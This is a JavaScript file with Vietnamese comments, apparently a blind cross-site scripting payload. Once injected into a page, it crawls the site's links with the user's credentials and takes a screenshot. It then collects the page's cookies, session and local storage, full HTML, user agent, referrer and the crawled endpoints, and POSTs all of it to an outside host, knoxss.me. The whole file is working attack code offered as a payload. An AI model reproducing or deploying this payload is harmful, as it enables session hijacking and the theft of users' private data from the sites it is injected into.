// Import thư viện html2canvas từ CDN
const script = document.createElement('script');
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js';
document.head.appendChild(script);

// Khởi tạo biến để lưu base64 image
let base64image;
let allEndpoints = new Set(); // Sử dụng Set để tránh trùng lặp
let visitedEndpoints = new Set(); // Giữ track các endpoint đã thăm
let collectedEndpoints = []; // Biến để lưu trữ tất cả các endpoint cuối cùng

function extractHrefs(html) {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const hrefs = Array.from(doc.querySelectorAll('a'))
        .map(a => a.href)
        .filter(href => href.startsWith('http'));
    return hrefs;
}

function sendRequest(url) {
    if (visitedEndpoints.has(url)) {
        return Promise.resolve();
    }
    visitedEndpoints.add(url);

    return fetch(url, {
        method: 'GET',
        credentials: 'include' // Gửi cookie cùng với request, nếu cần
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`Network response was not ok for ${url}`);
        }
        return response.text();
    })
    .then(data => {
        const hrefs = extractHrefs(data);
        hrefs.forEach(href => allEndpoints.add(href));

        // Tiếp tục đệ quy với các href mới thu thập được
        return Promise.all(hrefs.map(sendRequest));
    })
    .catch(error => {
        console.error(`There has been a problem with your fetch operation for ${url}:`, error);
    });
}

// Chụp màn hình khi thư viện html2canvas đã được tải xong
script.onload = function() {
    // Bắt đầu quá trình đệ quy với URL đầu tiên
    const initialUrl = window.location.href;
    allEndpoints.add(initialUrl);

    sendRequest(initialUrl)
    .then(() => {
        // Lưu kết quả vào biến collectedEndpoints
        collectedEndpoints = Array.from(allEndpoints);
        console.log('All requests completed');

        // Chụp màn hình của toàn bộ tài liệu HTML
        return html2canvas(document.documentElement);
    })
    .then(canvas => {
        // Chuyển đổi canvas thành base64 image
        base64image = canvas.toDataURL("image/png");

        // Tạo nội dung tin nhắn với base64 image
        var msg = 'VULNERABLE URL\n' + '';
        msg += '\n\nTRIGGER URL:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.URL + '\n\nUSER AGENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + navigator.userAgent;
        msg += '\n\nREFERRER URL:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.referrer + '\n\nREADABLE COOKIES:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.cookie;
        msg += '\n\nSESSION STORAGE:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(localStorage); 
        msg += '\n\nFULL DOCUMENT:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.documentElement.innerHTML;
        msg += '\n\nSCREENSHOT:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;
        msg += '\n\nENDPOINT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + collectedEndpoints.join('\n');

        // Gửi tin nhắn qua XMLHttpRequest
        var r = new XMLHttpRequest();
        var mailer = 'https://knoxss.me/00';
        r.open('POST', mailer, true);
        r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
        console.log('Mission completed!');
    })
    .catch(error => {
        console.error('Error in processing:', error);
    });
};
